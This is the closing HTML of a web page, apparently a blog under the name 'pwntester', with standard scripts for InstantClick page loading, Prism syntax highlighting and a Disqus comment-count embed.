    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

